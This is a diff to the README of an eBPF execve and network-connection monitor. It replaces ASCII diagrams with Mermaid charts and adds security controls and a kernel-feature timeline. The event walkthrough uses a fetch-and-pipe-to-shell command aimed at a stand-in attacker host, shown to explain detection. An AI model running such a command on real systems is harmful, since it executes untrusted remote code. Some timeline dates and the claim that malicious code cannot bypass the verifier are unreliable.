@@ -8,147 +8,110 @@ network connection monitoring with active mitigation capabilities.
 
 ## High-Level Architecture
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                    KERNEL SPACE  ·  Ring 0                              │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│   ┌──────────────────┐     ┌──────────────────┐                         │
-│   │   Tracepoints    │     │     Kprobes      │                         │
-│   │ sys_enter_execve │     │  tcp_v4_connect  │                         │
-│   │ sys_exit_execve  │     │                  │                         │
-│   └────────┬─────────┘     └────────┬─────────┘                         │
-│            │                        │                                   │
-│            ▼                        ▼                                   │
-│   ┌────────────────────────────────────────────┐                        │
-│   │        BPF Program (verified, JIT'd)       │                        │
-│   │  ─ capture pid/uid/comm/filename/ip/port   │                        │
-│   │  ─ filter: suspicious bins & ports         │                        │
-│   │  ─ write struct to ring buffer             │                        │
-│   └────────────────────┬───────────────────────┘                        │
-│                        │                                                │
-│                        ▼                                                │
-│   ┌────────────────────────────────────────────┐                        │
-│   │   BPF_RINGBUF_OUTPUT   (lock-free, MPMC)   │                        │
-│   └────────────────────┬───────────────────────┘                        │
-│                        │                                                │
-└────────────────────────┼────────────────────────────────────────────────┘
-                         │  perf / ring-buffer polling
-                         ▼
-┌─────────────────────────────────────────────────────────────────────────┐
-│                    USER SPACE  ·  Ring 3                                │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│   ┌────────────────────────────────────────────┐                        │
-│   │        ProcessExecveMonitor (Python)       │                        │
-│   │  ─ bcc.BPF loader & ctypes event parser    │                        │
-│   │  ─ threat heuristics                       │                        │
-│   └────────────────────┬───────────────────────┘                        │
-│                        │                                                │
-│           ┌────────────┼────────────┐                                   │
-│           ▼            ▼            ▼                                   │
-│   ┌─────────────┐ ┌──────────┐ ┌──────────────┐                         │
-│   │JSON/Human   │ │  ALERT   │ │ Mitigation   │                         │
-│   │log stream   │ │  stream  │ │  Engine      │                         │
-│   │(stdout)     │ │ (stderr) │ │ (SIGKILL /   │                         │
-│   │             │ │          │ │  iptables)   │                         │
-│   └─────────────┘ └──────────┘ └──────────────┘                         │
-│                                                                         │
-└─────────────────────────────────────────────────────────────────────────┘
+```mermaid
+flowchart TB
+    subgraph KS["KERNEL SPACE (Ring 0)"]
+        TP["Tracepoints\nsys_enter/exit_execve"]
+        KP["Kprobes\ntcp_v4_connect"]
+        BPF["BPF Program\n(verified, JIT'd)"]
+        RB["BPF_RINGBUF_OUTPUT\n(lock-free, MPMC)"]
+    end
+
+    subgraph US["USER SPACE (Ring 3)"]
+        PM["ProcessExecveMonitor\n(Python BCC)"]
+        JSON["JSON/Human\nlog stream (stdout)"]
+        ALERT["ALERT\nstream (stderr)"]
+        MIT["Mitigation Engine\n(SIGKILL / iptables)"]
+    end
+
+    TP --> BPF
+    KP --> BPF
+    BPF --> RB
+    RB -->|perf / ring-buffer polling| PM
+    PM --> JSON
+    PM --> ALERT
+    PM --> MIT
 ```
 
 ## Event Lifecycle (single `execve`)
 
-Traces one real attack &mdash; `curl http://attacker/x.sh | bash` &mdash; from the
+Traces one real attack — `curl http://attacker/x.sh | bash` — from the
 moment `execve()` enters the kernel, through the eBPF filter and ring buffer,
 into user space, and finally out to the mitigation engine.
 
+```mermaid
+sequenceDiagram
+    autonumber
+    participant U as User Space
+    participant K as Kernel Space
+    participant TP as Tracepoint
+    participant BPF as BPF Program
+    participant RB as Ring Buffer
+    participant P as Python Monitor
+    participant H as Heuristics
+    participant M as Mitigation
+
+    U->>K: execve("/bin/bash", ...)
+    K->>TP: sys_enter_execve
+    TP->>BPF: Trigger BPF hook
+    BPF->>BPF: Read pid, uid, comm, filename
+    BPF->>BPF: Kernel-side filter (uid==0? /tmp?)
+    alt Filter match
+        BPF->>RB: ringbuf_output(event)
+        RB-->>P: Perf buffer poll
+        P->>P: Decode ctypes event
+        P->>H: Run threat heuristics
+        H->>H: Severity assessment
+        alt Severity HIGH
+            H->>M: Trigger mitigation
+            M->>M: os.kill(pid, SIGKILL)
+            M->>M: iptables -I OUTPUT 1 -d IP -j DROP
+            M->>P: Record forensic log
+        else Severity LOW/MED
+            H->>P: Log event (INFO)
+        end
+        P-->>U: JSON output / Human line
+    else Filter no-match
+        BPF->>BPF: Drop event (0 overhead)
+    end
 ```
-  ┌─────────────────────────────────────────────────────────────────┐
-  │        $ curl http://attacker/x.sh | bash                       │
-  └──────────────────────────────┬──────────────────────────────────┘
-                                 │  syscall enter
-                                 ▼
-               ┌───────────────────────────────────────────────┐
-               │   KERNEL SPACE  ·  Ring 0                     │
-               └───────────────────────────────────────────────┘
-                                 │
-                                 ▼
-                    ┌──────────────────────────┐
-                    │  Tracepoint hook fires   │
-                    │   sys_enter_execve       │
-                    └────────────┬─────────────┘
-                                 │
-                                 ▼
-                    ┌──────────────────────────┐
-                    │   BPF prog reads regs    │
-                    │  ─ pid, tgid, uid        │
-                    │  ─ comm (TASK_COMM_LEN)  │
-                    │  ─ filename  (argv[0])   │
-                    └────────────┬─────────────┘
-                                 │
-                                 ▼
-                    ┌──────────────────────────┐
-                    │   Kernel-side filter     │
-                    │  ─ uid == 0 ?            │──── No ───▶ drop event
-                    │  ─ path in /tmp ?        │              (0 overhead)
-                    │  ─ comm in blocklist     │
-                    └────────────┬─────────────┘
-                                 │ match
-                                 ▼
-                    ┌──────────────────────────┐
-                    │  ringbuf_output(event)   │    ~1-2 µs
-                    └────────────┬─────────────┘
-                                 │
-                ┌───────────────────────────────────────────┐
-                │                 perf buffer → user space  │
-                ▼                                           ▼
-               ┌───────────────────────────────────────────────┐
-               │   USER SPACE  ·  Ring 3                       │
-               └───────────────────────────────────────────────┘
-                                 │
-                                 ▼
-                    ┌──────────────────────────┐
-                    │   Python callback        │
-                    │   _handle_event(event)   │
-                    └────────────┬─────────────┘
-                                 │
-               ┌─────────────────┼─────────────────┐
-               ▼                 ▼                 ▼
-      ┌────────────────┐ ┌───────────────┐ ┌─────────────────┐
-      │  Emit JSON     │ │ Human-readable│ │   Threat        │
-      │  to stdout     │ │  line stderr  │ │   heuristics    │
-      │  (SIEM feed)   │ │  (if --human) │ │  (see tree)     │
-      └────────────────┘ └───────────────┘ └────────┬────────┘
-                                                │
-                                                ▼
-                                      ┌──────────────────┐
-                                      │  severity HIGH ? │
-                                      └────────┬─────────┘
-                                               │
-                                    ┌──────────┴──────────┐
-                                    │                     │
-                                    No                    Yes
-                                    │                     │
-                                    ▼                     ▼
-                          ┌──────────────┐    ┌────────────────────┐
-                          │  Log event   │    │  Mitigation        │
-                          │  (INFO/MED)  │    │    dispatcher      │
-                          └──────────────┘    └────────┬───────────┘
-                                                   │
-                                        ┌──────────┴──────────┐
-                                        ▼                     ▼
-                          ┌──────────────┐    ┌────────────────────┐
-                          │ os.kill(pid, │    │ iptables -I OUTPUT │
-                          │  SIGKILL)    │    │  1 -d IP -j DROP   │
-                          └──────────────┘    └────────────────────┘
-                                                   │
-                                                   ▼
-                          ┌────────────────────────────────┐
-                          │   Record forensic event log    │
-                          │  (ISO timestamp · action ·     │
-                          │   pid · uid · ip · comm)       │
-                          └────────────────────────────────┘
+
+### Visual Event Pipeline
+
+```mermaid
+flowchart TB
+    subgraph Kernel["KERNEL SPACE (Ring 0)"]
+        TP2["sys_enter_execve"]
+        BPF2["BPF Filter"]
+        RB2["Ring Buffer"]
+    end
+
+    subgraph Userspace["USER SPACE (Ring 3)"]
+        CB["Python Callback"]
+        JSON["JSON stdout"]
+        HUMAN["Human stderr"]
+        HEUR["Threat Heuristics"]
+        SEV{"Severity?"}
+        LOG["Log Event"]
+        MIT["Mitigation"]
+        KILL["os.kill SIGKILL"]
+        IPT["iptables DROP"]
+        FORENSIC["Forensic Log"]
+    end
+
+    TP2 --> BPF2
+    BPF2 -->|match| RB2
+    BPF2 -->|no match| DROP["Drop (0 overhead)"]
+    RB2 --> CB
+    CB --> JSON
+    CB --> HUMAN
+    CB --> HEUR
+    HEUR --> SEV
+    SEV -->|HIGH| MIT
+    SEV -->|LOW/MED| LOG
+    MIT --> KILL
+    MIT --> IPT
+    MIT --> FORENSIC
 ```
 
 ## Data-Structure Layout
@@ -178,6 +141,12 @@ read by the Python user-space manager via `ctypes.Structure`:
 | `execve_monitor.c` | eBPF kernel program (C) - Hooks sys_execve and tcp_v4_connect |
 | `../process_execve_monitor.py` | User-space manager - Loads eBPF, handles mitigation and alerts |
 | `../install_ebpf_deps.sh` | Automated setup script for BCC, kernel headers, and iptables |
+## Security Controls
+- **Path Validation**: The `--source` argument is validated against allowed paths before loading
+- **Bounded Storage**: Event and alert buffers are capped at 10,000 entries to prevent memory exhaustion
+- **IP Block Limits**: Maximum of 1,000 blocked IPs to prevent resource exhaustion
+- **Safe Mode Default**: Mitigation defaults to log-only unless `--enforce` is explicitly passed
+
 ## Setup & Installation
 ### Quick Setup (Automated)
 ```bash
@@ -299,52 +268,15 @@ High-severity threats are logged separately to stderr:
 The heuristic pipeline runs in user space after each event is delivered from
 the ring buffer. The decision tree below shows how an event is classified:
 
-```
-                     ┌──────────────────┐
-                     │   execve event   │
-                     └────────┬─────────┘
-                              │
-                              ▼
-                    ╱────────────────────╲
-                   ╱   uid == 0  AND      ╲
-                   ╲   comm NOT in        ╱─────────┐
-                    ╲   SYSTEM_BINS      ╱          │
-                     ╲──────────┬───────╱           │
-                                │ Yes               │ No
-                                ▼                   │
-                     ┌──────────────────┐           │
-                     │   ALERT  HIGH    │           │
-                     │  "Unauth root    │           │
-                     │   execution"     │           │
-                     └──────────────────┘           │
-                                                    ▼
-                                       ╱────────────────────╲
-                                      ╱    filename in       ╲
-                                      ╲   /tmp, /dev/shm,    ╱──────┐
-                                       ╲    /var/tmp ?      ╱       │
-                                        ╲──────────┬───────╱        │
-                                                   │ Yes            │ No
-                                                   ▼                │
-                                       ┌──────────────────┐         │
-                                       │   ALERT  HIGH    │         │
-                                       │   "Binary in     │         │
-                                       │  suspicious loc" │         │
-                                       └──────────────────┘         │
-                                                                    ▼
-                                                          ╱────────────────╲
-                                                         ╱    exit event    ╲
-                                                         ╲   retval != 0 ?  ╱───┐
-                                                          ╲─────┬──────────╱    │
-                                                                │ Yes           │ No
-                                                                ▼               │
-                                                     ┌──────────────────┐       │
-                                                     │   ALERT  MEDIUM  │       │
-                                                     │  "Failed execve" │       │
-                                                     └──────────────────┘       │
-                                                                                |
-                                                      ┌──────────────────┐      │
-                                                      │ INFO (log only)  │   <──┘    
-                                                      └──────────────────┘        
+```mermaid
+flowchart TD
+    A["execve event"] --> B{"uid == 0 AND\ncomm NOT in SYSTEM_BINS"}
+    B -->|Yes| C["ALERT HIGH\nUnauth root execution"]
+    B -->|No| D{"filename in\n/tmp, /dev/shm, /var/tmp?"}
+    D -->|Yes| E["ALERT HIGH\nBinary in suspicious loc"]
+    D -->|No| F{"exit event\nretval != 0?"}
+    F -->|Yes| G["ALERT MEDIUM\nFailed execve"]
+    F -->|No| H["INFO\nlog only"]
 ```
 
 The monitor includes lightweight threat detection:
@@ -448,17 +380,19 @@ sudo python3 process_execve_monitor.py --source zenith/ebpf/execve_monitor.c 2>&
 ```
 ## Security Considerations
 1. **Requires Root**: eBPF program attachment requires root privileges. Use with caution.
-2. **Audit Logging**: Enable auditd to log all eBPF program attachments:
+2. **Source Path Validation**: The BPF source path is validated before loading to prevent loading untrusted code.
+3. **Bounded Storage**: Event and alert collections have hard limits (10,000) to prevent memory exhaustion from high-event workloads.
+4. **Audit Logging**: Enable auditd to log all eBPF program attachments:
    ```bash
    sudo auditctl -w /sys/kernel/debug/tracing/ -p wa
    ```
-3. **Output Protection**: Events are streamed to stdout/stderr. Protect output:
+5. **Output Protection**: Events are streamed to stdout/stderr. Protect output:
    ```bash
    sudo python3 process_execve_monitor.py ... | sudo tee -a /var/log/zenith/events.log
    sudo chmod 600 /var/log/zenith/events.log
    ```
-4. **Kernel Verifier**: All eBPF bytecode is verified by the kernel before execution. Malicious code cannot bypass BPF verifier.
-5. **Immutability**: Events generated at kernel level cannot be forged from user space.
+6. **Kernel Verifier**: All eBPF bytecode is verified by the kernel before execution. Malicious code cannot bypass BPF verifier.
+7. **Immutability**: Events generated at kernel level cannot be forged from user space.
 ## Advanced Configuration
 ### Custom Threat Heuristics
 Edit `_threat_heuristics()` in `process_execve_monitor.py`:
@@ -484,6 +418,32 @@ TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
     // ... rest of code
 }
 ```
+## eBPF Evolution Timeline
+
+```mermaid
+timeline
+    title Linux eBPF Kernel Feature Evolution
+    2014 : eBPF introduced (kernel 3.18)
+         : Basic socket filtering
+    2016 : BPF maps added
+         : kprobes/tracepoints support
+         : BCC toolkit released
+    2017 : XDP (express data path)
+         : tc BPF programs
+    2018 : BPF Type Format (BTF)
+         : BPF skeletons
+    2019 : BPF ring buffer
+         : LSM BPF hooks
+    2020 : BPF iterators
+         : BPF CO-RE (compile once run everywhere)
+    2021 : BPF link abstraction
+         : Sleepable BPF programs
+    2022 : BPF memory accounting
+         : User-space memory helpers
+    2023 : BPF ftrace integration
+         : Hardware offload support
+```
+
 ## References
 - [BCC Documentation](https://github.com/iovisor/bcc)
 - [eBPF Linux Kernel Documentation](https://www.kernel.org/doc/html/latest/userspace-api/ebpf/)
